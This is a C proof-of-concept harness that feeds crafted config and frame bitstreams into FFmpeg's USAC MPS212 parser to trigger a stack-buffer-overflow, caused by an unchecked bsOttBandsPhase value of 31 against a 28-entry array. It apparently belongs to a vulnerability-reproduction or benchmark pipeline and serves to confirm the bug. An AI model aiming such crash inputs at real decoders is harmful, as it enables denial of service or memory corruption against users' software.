/* PoC harness (stage 2): after configuring the element with the same crafted
 * bits as harness_config.c (real target function decode_usac_element_pair),
 * feed a crafted per-frame MPS212 payload into the real target function
 * parse_mps212() (added by the introducing commit, absent pre-intro).
 *
 * Root cause (matches meta.json): bsOttBandsPhase (5 bits, max 31) is stored
 * into e->mps.otts_bands_phase without being range-checked against numBands
 * (<=28, ISO/IEC 23003-1:2007 Table 39). parse_mps212() then passes it
 * unclamped as `end_band` to ff_aac_ec_data_dec() for the IPD data set. Deep
 * inside (ec_pair_dec -> the backwards/diff_freq==0 branch), the code does:
 *     for (int i = 0; i < nb_bands; i++)          // nb_bands = 31
 *         last_msb[i] = last[i + start_band] + quant_offset;
 * where `last_msb` is a fixed `int16_t last_msb[MPS_MAX_PARAM_BANDS]` (28)
 * stack array -> stack-buffer-overflow (out-of-bounds array access) once
 * i reaches 28, i.e. exactly 3 elements past the declared bound, matching
 * the reported "out of array access" / OutOfBoundsRead defect.
 *
 * Built only against post_intro / post_benign (parse_mps212 does not exist
 * pre-intro at all -- confirmed by source inspection: no aacdec_usac_mps212.*
 * files and no parse_mps212 references pre-intro).
 */
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include "/work/libavcodec/aac/aacdec_usac.c"

typedef struct { uint8_t buf[256]; int nbits; } BitWriter;
static void bw_put(BitWriter *bw, unsigned val, int width) {
    for (int i = width - 1; i >= 0; i--) {
        int bit = (val >> i) & 1;
        int byte = bw->nbits / 8, off = bw->nbits % 8;
        if (bit) bw->buf[byte] |= (0x80 >> off);
        bw->nbits++;
    }
}

int main(void) {
    /* ---- Stage 1: config (identical to harness_config.c) ---- */
    BitWriter cw; memset(&cw, 0, sizeof(cw));
    bw_put(&cw, 0, 1); bw_put(&cw, 0, 1); bw_put(&cw, 0, 1); /* sbr flags */
    bw_put(&cw, 0, 4); bw_put(&cw, 0, 4);                   /* start/stop freq */
    bw_put(&cw, 0, 1); bw_put(&cw, 0, 1);                   /* header_extra1/2 */
    bw_put(&cw, 1, 2);  /* stereo_config_index = 1 */
    bw_put(&cw, 1, 3);  /* bsFreqRes = 1 -> numBands = 28 */
    bw_put(&cw, 0, 3); bw_put(&cw, 0, 2); bw_put(&cw, 0, 2);
    bw_put(&cw, 0, 1);  /* bsHighRateMode = 0 */
    bw_put(&cw, 1, 1);  /* bsPhaseCoding = 1 */
    bw_put(&cw, 1, 1);  /* bsOttBandsPhasePresent = 1 */
    bw_put(&cw, 31, 5); /* bsOttBandsPhase = 31 */

    GetBitContext cgb;
    init_get_bits(&cgb, cw.buf, sizeof(cw.buf) * 8);

    AACDecContext ac; memset(&ac, 0, sizeof(ac));
    ac.avctx = NULL;

    AACUsacElemConfig e; memset(&e, 0, sizeof(e));
    e.sbr.ratio = 1;

    int cret = decode_usac_element_pair(&ac, &e, &cgb);
    printf("CONFIG ret=%d otts_bands_phase=%d\n", cret, e.mps.otts_bands_phase);

    if (cret < 0) {
        printf("RESULT config-stage rejected out-of-range value; "
               "frame stage not reached (matches real decoder control flow)\n");
        return 0;
    }

    /* ---- Stage 2: per-frame MPS212 payload -> parse_mps212() ---- */
    BitWriter fw; memset(&fw, 0, sizeof(fw));

    bw_put(&fw, 0, 1); /* indep (frame_indep_flag=0, so this bit is read) */

    /* CLD: nb_param_sets=2, both data_mode=0 (default fill, bounded by nb_bands=28) */
    bw_put(&fw, 0, 2); bw_put(&fw, 0, 2);
    /* ICC: same */
    bw_put(&fw, 0, 2); bw_put(&fw, 0, 2);

    /* IPD gate */
    bw_put(&fw, 1, 1); /* enter IPD branch */
    bw_put(&fw, 0, 1); /* opd_smoothing_mode */

    /* IPD ec_data_dec: data_mode[0]=3 (pair/ec-coded), data_mode[1]=0 */
    bw_put(&fw, 3, 2);
    bw_put(&fw, 0, 2);
    /* processing i=0, data_mode==3 */
    bw_put(&fw, 0, 1); /* data_pair = 0 (pair flag for ec_pair_dec) */
    bw_put(&fw, 0, 1); /* coarse_quant[0] = 0 */
    bw_put(&fw, 3, 2); /* freq_res[0] = 3 -> stride_table[3] = 28 */

    /* ec_pair_dec: */
    bw_put(&fw, 0, 1); /* pcm_coding = 0 (take huffman/diff path) */
    bw_put(&fw, 1, 1); /* diff_freq[0] source bit: diff_freq[0] = !bit = 0 */
    bw_put(&fw, 0, 1); /* huff_decode: dim = 0 (1D coding) */
    /* huff_data_1d(): 31 symbols, each a 1-bit code "0" in
     * ff_aac_hcod1D_IPD[0] ({-1,1} at root) decoding to value 0. The crash
     * (stack-buffer-overflow write to last_msb[28]) occurs while processing
     * symbol index 28 (the 29th symbol), inside the subsequent
     * diff-decode "backwards" loop over nb_bands=31 that copies these
     * symbols via `last_msb[i] = last[i+start_band] + quant_offset`. */
    for (int i = 0; i < 31; i++)
        bw_put(&fw, 0, 1);

    GetBitContext fgb;
    init_get_bits(&fgb, fw.buf, sizeof(fw.buf) * 8);

    AACUSACConfig usac; memset(&usac, 0, sizeof(usac));
    usac.core_sbr_frame_len_idx = 0;

    AACUsacMPSData mps; memset(&mps, 0, sizeof(mps));

    printf("Calling parse_mps212() now; a stack-buffer-overflow under ASan "
           "is expected in the vulnerable (post_intro) build.\n");
    fflush(stdout);

    int fret = parse_mps212(&ac, &usac, &mps, &e, &fgb, /*frame_indep_flag=*/0);

    printf("RESULT parse_mps212 ret=%d (no crash / sanitizer did not fire)\n", fret);
    return 0;
}
